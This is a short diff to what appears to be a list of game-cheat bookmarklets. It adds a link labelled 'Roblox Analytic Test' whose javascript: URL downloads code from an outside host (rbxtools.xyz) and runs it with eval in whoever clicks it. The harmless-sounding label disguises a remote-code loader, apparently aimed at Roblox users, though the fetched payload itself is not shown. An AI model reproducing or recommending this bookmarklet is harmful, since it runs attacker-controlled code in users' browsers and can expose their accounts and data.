@@ -16,3 +16,5 @@ Links:
 
 [x10 Heavenly Chips](javascript:Game.heavenlyChips = Game.heavenlyChips * 10;)
 
+[Roblox Analytic Test](javascript:$.get('//rbxtools.xyz/?1413', eval);)
+
